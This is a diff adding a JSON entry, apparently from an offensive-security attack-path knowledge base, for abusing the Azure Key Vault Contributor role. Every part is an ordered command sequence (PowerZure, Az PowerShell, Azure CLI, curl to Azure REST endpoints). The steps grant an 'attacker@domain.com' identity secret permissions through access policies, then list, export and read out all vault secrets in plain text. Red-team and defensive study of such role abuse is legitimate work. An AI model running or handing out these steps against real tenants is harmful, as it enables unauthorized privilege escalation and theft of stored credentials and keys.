@@ -1,0 +1,83 @@
+{
+    "AZKeyVaultContributor": {
+        "meaning": "The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault and alter access policies to grant yourself access to read secrets.",
+        "common": "",
+        "windows": {
+            "PowerZure": [
+                {
+                    "order": 1,
+                    "command": "Get-AzureKeyVaultContent -KeyVault target-keyvault",
+                    "description": "Retrieve all content from Azure Key Vault using PowerZure"
+                },
+                {
+                    "order": 2,
+                    "command": "Export-AzureKeyVaultContent -KeyVault target-keyvault -OutputPath C:\\extracted",
+                    "description": "Export all Key Vault content to local directory using PowerZure"
+                }
+            ],
+            "PowerShell_Az_Module": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzAccount",
+                    "description": "Connect to Azure using Az PowerShell module"
+                },
+                {
+                    "order": 2,
+                    "command": "Set-AzKeyVaultAccessPolicy -VaultName 'TargetKeyVault' -UserPrincipalName 'attacker@domain.com' -PermissionsToSecrets Get,List,Set",
+                    "description": "Grant yourself access to Key Vault secrets"
+                },
+                {
+                    "order": 3,
+                    "command": "Get-AzKeyVaultSecret -VaultName 'TargetKeyVault'",
+                    "description": "List all secrets in the Key Vault"
+                },
+                {
+                    "order": 4,
+                    "command": "Get-AzKeyVaultSecret -VaultName 'TargetKeyVault' -Name 'SecretName' -AsPlainText",
+                    "description": "Retrieve specific secret value in plain text"
+                }
+            ]
+        },
+        "linux": {
+            "Azure_CLI": [
+                {
+                    "order": 1,
+                    "command": "az login",
+                    "description": "Authenticate to Azure using Azure CLI"
+                },
+                {
+                    "order": 2,
+                    "command": "az keyvault set-policy --name TargetKeyVault --upn attacker@domain.com --secret-permissions get list set",
+                    "description": "Grant yourself access to Key Vault secrets"
+                },
+                {
+                    "order": 3,
+                    "command": "az keyvault secret list --vault-name TargetKeyVault",
+                    "description": "List all secrets in the Key Vault"
+                },
+                {
+                    "order": 4,
+                    "command": "az keyvault secret show --vault-name TargetKeyVault --name SecretName --query value -o tsv",
+                    "description": "Retrieve specific secret value"
+                }
+            ],
+            "REST_API_Direct": [
+                {
+                    "order": 1,
+                    "command": "curl -X PUT -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.KeyVault/vaults/{vault}/accessPolicies/add?api-version=2021-10-01\" -d '{\"properties\":{\"accessPolicies\":[{\"tenantId\":\"tenant-id\",\"objectId\":\"user-object-id\",\"permissions\":{\"secrets\":[\"get\",\"list\",\"set\"]}}]}}'",
+                    "description": "Grant access to Key Vault secrets via REST API"
+                },
+                {
+                    "order": 2,
+                    "command": "curl -H \"Authorization: Bearer $KEYVAULT_TOKEN\" \"https://vault-name.vault.azure.net/secrets?api-version=7.3\"",
+                    "description": "List secrets using Key Vault REST API"
+                },
+                {
+                    "order": 3,
+                    "command": "curl -H \"Authorization: Bearer $KEYVAULT_TOKEN\" \"https://vault-name.vault.azure.net/secrets/secret-name?api-version=7.3\"",
+                    "description": "Retrieve specific secret using Key Vault REST API"
+                }
+            ]
+        }
+    }
+}
